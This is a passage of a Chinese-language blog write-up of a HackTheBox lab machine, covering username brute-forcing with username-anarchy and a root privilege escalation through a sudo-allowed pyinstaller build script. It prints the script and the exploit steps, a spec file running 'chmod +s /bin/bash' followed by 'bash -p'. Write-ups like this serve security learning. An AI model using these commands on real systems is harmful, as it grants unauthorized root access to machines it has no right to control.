+<h1 id="用户名爆破"><a href="#用户名爆破" class="headerlink" title="用户名爆破"></a>用户名爆破</h1><p>其中暴露了一个用户名<code>keller</code>但是当你尝试用keller登录时，密码又不对，这一点就很搞知道吧<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624467135-124f930d-c0f9-4694-88dc-e32cd01f6d7a.png#averageHue=%2322242b&clientId=u8b12b25a-26d3-4&from=paste&height=139&id=u15a1698d&name=image.png&originHeight=174&originWidth=604&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41031&status=done&style=none&taskId=u256b1da2-2f81-4e9c-b40a-19ba0a778c6&title=&width=483.2" alt="image.png"><br>最后去论坛看了一下，发现还需要对用户名进行一个前缀爆破<br>用的 username-anarchy 这个工具来构造字典的<br><a target="_blank" rel="noopener" href="https://github.com/urbanadventurer/username-anarchy">urbanadventurer&#x2F;username-anarchy: Username tools for penetration testing (github.com)</a><br>感觉完全多此一举，最后发现是<code>tkeller</code>这个用户<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624530925-40720519-b0bd-4193-ae31-56f5cdf359f8.png#averageHue=%2322242b&clientId=u8b12b25a-26d3-4&from=paste&height=141&id=uc413909a&name=image.png&originHeight=176&originWidth=513&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37537&status=done&style=none&taskId=u6592de88-0684-4e5c-852f-fac28189b47&title=&width=410.4" alt="image.png"><br>获取user.txt</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>常规思路<code>sudo -l</code>看看有什么可控的sudo权限<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624555976-41bf5489-b769-4b2c-8f52-90d2c1f6b3d0.png#averageHue=%2323252c&clientId=u8b12b25a-26d3-4&from=paste&height=141&id=u69ac1ca6&name=image.png&originHeight=176&originWidth=705&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44647&status=done&style=none&taskId=u0b854527-81f0-4ecb-992d-6c8a1533b08&title=&width=564" alt="image.png"><br>得到了一个sh脚本，我们可以看看这个脚本是干啥的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">if [ $# -ne 2 ] &amp;&amp; [[ $1 != &#x27;cleanup&#x27; ]]; then</span><br><span class="line">  /usr/bin/echo &quot;No enough arguments supplied&quot;</span><br><span class="line">  exit 1;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">action=$1</span><br><span class="line">name=$2</span><br><span class="line">ext=$(/usr/bin/echo $2 |/usr/bin/awk -F&#x27;.&#x27; &#x27;&#123; print $(NF) &#125;&#x27;)</span><br><span class="line"></span><br><span class="line">if [[ -L $name ]];then</span><br><span class="line">  /usr/bin/echo &#x27;Symlinks are not allowed&#x27;</span><br><span class="line">  exit 1;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [[ $action == &#x27;build&#x27; ]]; then</span><br><span class="line">  if [[ $ext == &#x27;spec&#x27; ]] ; then</span><br><span class="line">    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2&gt;/dev/null</span><br><span class="line">    /home/svc/.local/bin/pyinstaller $name</span><br><span class="line">    /usr/bin/mv ./dist ./build /opt/shared</span><br><span class="line">  else</span><br><span class="line">    echo &quot;Invalid file format&quot;</span><br><span class="line">    exit 1;</span><br><span class="line">  fi</span><br><span class="line">elif [[ $action == &#x27;make&#x27; ]]; then</span><br><span class="line">  if [[ $ext == &#x27;py&#x27; ]] ; then</span><br><span class="line">    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2&gt;/dev/null</span><br><span class="line">    /root/.local/bin/pyinstaller -F --name &quot;qreader&quot; $name --specpath /tmp</span><br><span class="line">   /usr/bin/mv ./dist ./build /opt/shared</span><br><span class="line">  else</span><br><span class="line">    echo &quot;Invalid file format&quot;</span><br><span class="line">    exit 1;</span><br><span class="line">  fi</span><br><span class="line">elif [[ $action == &#x27;cleanup&#x27; ]]; then</span><br><span class="line">  /usr/bin/rm -r ./build ./dist 2&gt;/dev/null</span><br><span class="line">  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2&gt;/dev/null</span><br><span class="line">  /usr/bin/rm /tmp/qreader* 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &#x27;Invalid action&#x27;</span><br><span class="line">  exit 1;</span><br><span class="line">fi</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以发现这个脚本有3个功能,<code>spec make build</code>，这里我问了问newbing<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624676026-b8a3d554-cbbb-4378-ad7d-24942a151245.png#averageHue=%23e6ecf9&clientId=u8b12b25a-26d3-4&from=paste&height=224&id=ufbc79552&name=image.png&originHeight=280&originWidth=1021&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=90129&status=done&style=none&taskId=ua257eaac-753c-4f10-a425-e7538076a7f&title=&width=816.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624749824-542eac01-3aa0-4db5-9890-b1c1efa2a742.png#averageHue=%23e4ebf9&clientId=u8b12b25a-26d3-4&from=paste&height=170&id=u2668b857&name=image.png&originHeight=212&originWidth=1250&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=70651&status=done&style=none&taskId=u05c3015b-228e-4ed2-aac5-f50965dd9be&title=&width=1000" alt="image.png"><br>然后我们通过询问，发现执行这2个命令时，我执行我们文件里的代码！<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624819033-83543e45-21aa-4f88-bc44-6ec6fbeec4cf.png#averageHue=%23e7edf9&clientId=u8b12b25a-26d3-4&from=paste&height=154&id=u8c7cb803&name=image.png&originHeight=192&originWidth=913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61444&status=done&style=none&taskId=u2e2ef443-7c89-4e6e-b7df-1fba348541e&title=&width=730.4" alt="image.png"><br>那也就是说这也是一种另类的suid，我们可以给bash或者其他的指令添加suid权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo import os</span><br><span class="line">os.system(&#x27;chmod +s /bin/bash&#x27;) &gt;&gt; 1.spec</span><br></pre></td></tr></table></figure>
+<p><code>sudo /usr/local/sbin/build-installer.sh build 1.spec</code><br>运行过后就可以发现有suid权限了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624903085-de703092-40b7-46fd-b542-7aedb4a9f6fb.png#averageHue=%232e353a&clientId=u8b12b25a-26d3-4&from=paste&height=38&id=uf4eb4a99&name=image.png&originHeight=48&originWidth=489&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11928&status=done&style=none&taskId=ud3c76929-d06b-4b50-8e68-f8458969bab&title=&width=391.2" alt="image.png"><br>最后就是通过<code>bash -p</code>以root权限启动一个bash会话<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624919040-c2271fd7-0ac1-416d-b5a2-007adc146baa.png#averageHue=%23272930&clientId=u8b12b25a-26d3-4&from=paste&height=80&id=u49adb12d&name=image.png&originHeight=100&originWidth=451&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15592&status=done&style=none&taskId=u9dba3d4f-2181-4a2a-bfdd-965e032fa3d&title=&width=360.8" alt="image.png"><br>然后读取flag就好啦!<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624963087-421510a6-cb2c-4309-ad06-1e5607dc3e80.png#averageHue=%236d6e70&clientId=u8b12b25a-26d3-4&from=paste&height=86&id=u3b467b32&name=image.png&originHeight=108&originWidth=477&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17609&status=done&style=none&taskId=u7f2a7499-8fce-4ea0-a1eb-2ea0ab9e2a1&title=&width=381.6" alt="image.png"></p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/HackTheBox/" class="tag">#HackTheBox</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/04/08/BUUCTF1-2/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">BUUCTF Web Writeup 1-2</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/04/05/Boogipop-Forest/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">Forest</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
